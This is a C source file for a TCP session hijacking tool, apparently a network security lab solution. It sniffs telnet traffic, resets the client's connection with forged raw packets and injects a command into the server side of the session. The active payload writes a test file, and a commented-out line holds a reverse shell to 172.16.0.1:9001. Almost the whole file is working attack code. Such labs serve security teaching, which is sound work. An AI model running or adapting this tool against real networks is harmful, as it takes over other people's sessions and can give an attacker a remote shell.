#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<pcap.h>

#include "header.h"
#include "tcp_hijack.h"

//some global counter
int total=0;
int header_type;

void initialize();

uint8_t send_buf[BUF_SIZE]; //sending buffer
struct iphdr *out_iphdr;
struct tcphdr *out_tcphdr;
#define tcplen (sizeof(struct iphdr) + sizeof(struct tcphdr))
struct pseudo_udp_header psh; // tcp pseudo header
int fd;
struct sockaddr_in client_addr;
u_int32_t clientaddr, serveraddr;
int waitingmode = 1;
char auth_string[] = "user@machine3";
int payload_sent = 0;

int main(int argc, char *argv[])
{
	pcap_t *handle;
	pcap_if_t *all_dev, *dev;

	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
	char *dev_name;
	bpf_u_int32 net_ip, mask;


	//get all available devices
	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(1);
	}

	if(all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(1);
	}

	printf("Available devices list: \n");
	int c = 1;

	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}



	printf("Please choose the monitoring device (e.g., en0):\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end

	//look up the chosen device
	int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
	if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}

	struct sockaddr_in addr;
	addr.sin_addr.s_addr = net_ip;
	char ip_char[100];
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("NET address: %s\n", ip_char);

	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("Mask: %s\n", ip_char);

	//Create the handle
	if (!(handle = pcap_create(dev_name, err_buf))){
		fprintf(stderr, "Pcap create error : %s", err_buf);
		exit(1);
	}

	//If the device can be set in monitor mode (WiFi), we set it.
	//Otherwise, promiscuous mode is set
	if (pcap_can_set_rfmon(handle)==1){
		if (pcap_set_rfmon(handle, 1))
			pcap_perror(handle,"Error while setting monitor mode");
	}
	if(pcap_set_promisc(handle,1))
		pcap_perror(handle,"Error while setting promiscuous mode");

	if(pcap_set_immediate_mode(handle, 1))
		pcap_perror(handle, "Error while setting immediate mode");

	//Setting timeout for processing packets to 1 ms
	if (pcap_set_timeout(handle, 1))
		pcap_perror(handle,"Pcap set timeout error");

	//Activating the sniffing handle
	if (pcap_activate(handle))
		pcap_perror(handle,"Pcap activate error");

	// the the link layer header type
	// see http://www.tcpdump.org/linktypes.html
	header_type = pcap_datalink(handle);

	//BEGIN_SOLUTION
	char filter_exp[] = "tcp port 23";
	struct bpf_program fp;		/* The compiled filter expression */

	if (pcap_compile(handle, &fp, filter_exp, 0, net_ip) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}

	//END_SOLUTION

	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}

	printf("Device %s is opened. Begin sniffing with filter %s...\n", dev_name, filter_exp);

	initialize();
	//Put the device in sniff loop
	pcap_loop(handle , -1 , process_packet , NULL);

	pcap_close(handle);

	return 0;

}

void initialize(){
	bzero(send_buf, BUF_SIZE);
	
	// pointers
	out_iphdr = (struct iphdr*)send_buf;
	
	out_tcphdr = (struct tcphdr*)(send_buf + sizeof(struct iphdr));
	
	/*****************IP header************************/
	
	out_iphdr->version = 4;
	out_iphdr->ihl = 5;
	out_iphdr->tos = 0;
	out_iphdr->id = htons(25678);
	out_iphdr->frag_off = 0;
	out_iphdr->ttl = 255;
	out_iphdr->protocol = 6;

	/*****************TCP header********************/
		
	out_tcphdr->rst=1;
	out_tcphdr->doff=5;

	/*********** Socket setup **********/
	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if(fd < 0)
	{
		perror("Error creating raw socket ");
		exit(1);
	}

    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
	client_addr.sin_family = AF_INET;
}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer)
{
	int size = header->len;

	//	print_udp_packet(buffer, size);

//	PrintData(buffer, size);

	//Finding the beginning of IP header
	struct iphdr *in_iphr;
	switch (header_type)
	{
	case LINKTYPE_ETH:
		in_iphr = (struct iphdr*)(buffer + sizeof(struct ethhdr)); //For ethernet
		size -= sizeof(struct ethhdr);
		break;

	case LINKTYPE_NULL:
		in_iphr = (struct iphdr*)(buffer + 4);
		size -= 4;
		break;

	case LINKTYPE_WIFI:
		in_iphr = (struct iphdr*)(buffer + 57);
		size -= 57;
		break;

	default:
		fprintf(stderr, "Unknown header type %d\n", header_type);
		exit(1);
	}

	//the TCP header
	struct tcphdr *in_tcphdr = (struct tcphdr*)(in_iphr + 1);
	char* in_data = (char *)(in_tcphdr + 1);
	if(in_tcphdr->rst || (payload_sent && in_iphr->saddr != clientaddr)) return;
	if(strstr(in_data, auth_string) != NULL){
				waitingmode = 0;
				serveraddr = in_iphr->saddr;
				clientaddr = in_iphr->daddr;
				printf("Disabling waiting mode\n");
			}
	if(waitingmode) return;
	printf("a packet is received! %d \n", total++);
	/************** modify default packet ************/
	// modify ip header
	out_iphdr->saddr = in_iphr->daddr;
	out_iphdr->daddr = in_iphr->saddr;
	out_iphdr->check = checksum((short unsigned int *)send_buf, sizeof(struct iphdr));   
	// modify tcp header
	out_tcphdr->source = in_tcphdr->dest;
	out_tcphdr->dest = in_tcphdr->source;
	if(in_tcphdr->ack) out_tcphdr->seq = in_tcphdr->ack_seq;
	if(in_tcphdr->seq) out_tcphdr->ack_seq = htonl(ntohl(in_tcphdr->seq)+1);
	int packetlen = sizeof(struct iphdr) + sizeof(struct tcphdr);
	if(in_iphr->saddr == serveraddr){
		out_tcphdr->rst = 0;
		out_tcphdr->ack = 1;
		out_tcphdr->psh = 1;
		// char code[] = "/bin/sh -i >& /dev/tcp/172.16.0.1/9001 0>&1\r\n";
		char code[] = "echo 'test' > hack.txt\r\n";
		packetlen += strlen(code);
		char* data = (char *)(out_tcphdr + 1);
		strcat(data, code);
		payload_sent = 1;
		printf("Sending payload to server\n");
	}
	else if(in_iphr->saddr == clientaddr){
		out_tcphdr->rst = 1;
		out_tcphdr->ack = 0;
		out_tcphdr->psh = 0;
		printf("Sending rst to client\n");
	}

	out_iphdr->tot_len = htons(packetlen);
	out_tcphdr->check = 0;

	// checksum calculation
	psh.source_address = out_iphdr->saddr;
	psh.dest_address = out_iphdr->daddr;
	psh.udp_length = htons(packetlen-sizeof(struct iphdr));
	psh.placeholder = 0;
	psh.protocol = 6;
	size_t pseudopacket_len = ntohs(psh.udp_length) + sizeof(psh);
	char *pseudopacket = malloc(pseudopacket_len);
	memset(pseudopacket, 0, pseudopacket_len);
	memcpy(pseudopacket,(char *) &psh, sizeof(psh));
	memcpy(pseudopacket + sizeof(psh), (char *) out_tcphdr, pseudopacket_len-sizeof(psh));
	out_tcphdr->check = checksum((short unsigned int *)pseudopacket, pseudopacket_len);
	free(pseudopacket);
	printf("Sending packet of length %d\n", packetlen);
	//send packet
	client_addr.sin_port = out_tcphdr->dest;
	client_addr.sin_addr.s_addr = out_iphdr->daddr;
	if (sendto(fd, send_buf, packetlen ,  0, (struct sockaddr *) &client_addr, sizeof(client_addr)) < packetlen){
		perror("Failed to send packet ");
		exit(3);
	}
}

